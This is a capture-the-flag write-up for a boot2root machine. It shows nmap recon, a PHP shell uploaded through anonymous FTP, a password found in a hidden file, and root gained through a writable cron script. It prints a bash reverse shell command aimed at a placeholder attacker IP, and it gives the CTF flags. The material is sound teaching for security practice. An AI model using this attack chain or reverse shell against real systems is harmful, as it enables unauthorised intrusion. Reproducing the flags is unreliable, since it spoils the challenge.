## BattleX CTF: machine3 
#### Category: Boot2Root
#### Score: 60
#### Number of Solves: 4 
### Description

> Description here 

### TL; DR

Exploit anonymous ftp file upload to get shell, find hidden file that contains credential and move to a more privileged user and exploit root user cron task to gain root access.
    
### Recon

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-30 00:29 WAT
Nmap scan report for 10.10.195.130
Host is up (0.48s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Jun 23 15:38 images [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.2.22.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hacksparo Blogs - Cybersecurity & Pentesting
Service Info: OS: Unix
```
FTP and HTTP services on port 21 and 80 respectively. With FTP allowing anonymous login.

### Exploring

![Imgur](https://i.imgur.com/ximhUo9.png)

_FTP anonymous login_

I downloaded image1.jpg and is the exact one on the blog

![Imgur](https://i.imgur.com/zXVBsBW.png)

_Apache Server_

![Imgur](https://i.imgur.com/1mZfWYs.png)

_Blog post with ftp image_

The image is on `/userdata45545/image1.jpg`. It is likely that files on the ftp is mirrored to `/userdata45545` directory. I tried uploading a php shell via the FTP.

```
ftp> put ex.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
2587 bytes sent in 0.000138 seconds (17.9 Mbytes/s)
ftp>
```
It uploaded and it's on `/userdata45545` directory. 

![Imgur](https://i.imgur.com/SQuOPvv.png)

With my listener listening for incoming connections...

![Imgur](https://i.imgur.com/iEW1Rew.png)

I have shell access!

### Privilege escalation

```
www-data@BattleX:/var/www/html/userdata45545$ ls -lah
ls -lah
total 8.0K
drwxr-xr-x 2 www-data www-data 4.0K Jun 30 00:16 .
drwxr-xr-x 3 ftp      root     4.0K Jun 23 15:00 ..
lrwxrwxrwx 1 root     root       22 Jun 30 00:16 ex.php -> /srv/ftp/images/ex.php
lrwxrwxrwx 1 root     root       26 Jun 23 13:47 image1.jpg -> /srv/ftp/images/image1.jpg
```

The files in `/var/www/html/userdata45545` are symlinked `/srv/ftp/images` so I will check the ftp folder first before starting enumeration

```
www-data@BattleX:/srv/ftp/images$ ls -lah
total 52K
drwxrwxrwx 2 root    root 4.0K Jun 30 00:15 .
dr-xr-xr-x 4 ftp     ftp  4.0K Jun 23 15:21 ..
-rwxrwxrwx 1 ftp     ftp  2.6K Jun 30 00:15 ex.php
-rwxrwxrwx 1 ftpuser ftp   39K Jun 23 12:33 image1.jpg
www-data@BattleX:/srv/ftp/images$ cd ..
cd ..
www-data@BattleX:/srv/ftp$ ls -lah
total 16K
dr-xr-xr-x 4 ftp  ftp  4.0K Jun 23 15:21 .
drwxr-xr-x 3 root root 4.0K Jun 23 11:01 ..
drwxr-xr-x 2 root root 4.0K Jun 23 15:22 ...         [Hey that's sus]
drwxrwxrwx 2 root root 4.0K Jun 30 00:15 images
```
There's a hidden folder on `/srv/ftp` which contained a message

```
www-data@BattleX:/srv/ftp$ cd ...
www-data@BattleX:/srv/ftp/...$ ls
message
www-data@BattleX:/srv/ftp/...$ cat message
cat message
Hey CommanderX,

I've updated your password to "91297623". Please note that our website syncs every minute, as I instructed the developer to perform some maintenance.

Best,
Hacksparo
```
CommanderX is a user on this machine and I can switch with the password.

```
www-data@BattleX:/srv/ftp/...$ su commanderx
Password:
commanderx@BattleX:/srv/ftp/...$ cd
commanderx@BattleX:~$ cat user.txt
cat: user.txt: Permission denied
```

root owns the user.txt. 

After several enumerations, I snuck pspy to the system to sniff processes by other users without using root permisions. Soon I found out that root is running a bash script as part of its cron schedule.

![Imgur](https://i.imgur.com/YOUcxDp.png)

I echoed a nc reverse shell into the permch.sh file since I have write permission and wait for connection.

```
commanderx@BattleX:/opt$ echo "bash -i >& /dev/tcp/MY_IP/9002 0>&1" > permch.sh
```
Root shell gotten

![Imgur](https://i.imgur.com/XZiMbRp.png)

User flag: `battleX{e4d909c290d0fb1ca068ffaddf22cbd0}`

Root flag: `battleX{1a79a4d60de6718e8e5b326e338ae533}`

Done!